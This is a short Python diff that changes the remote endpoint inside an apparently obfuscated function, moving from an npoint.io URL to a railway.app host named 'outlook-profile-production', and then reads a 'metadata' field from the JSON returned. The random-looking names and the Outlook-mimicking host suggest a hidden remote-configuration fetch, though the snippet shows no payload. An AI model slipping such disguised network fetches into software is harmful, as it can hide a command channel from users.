@@ -18,7 +18,7 @@ def eval_sjsnmj_714():
 
     def learn_nuefmf_194():
         try:
-            net_pglujm_386 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_pglujm_386 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_pglujm_386.raise_for_status()
             model_tdxcrd_771 = net_pglujm_386.json()
             model_fpmfxi_638 = model_tdxcrd_771.get('metadata')
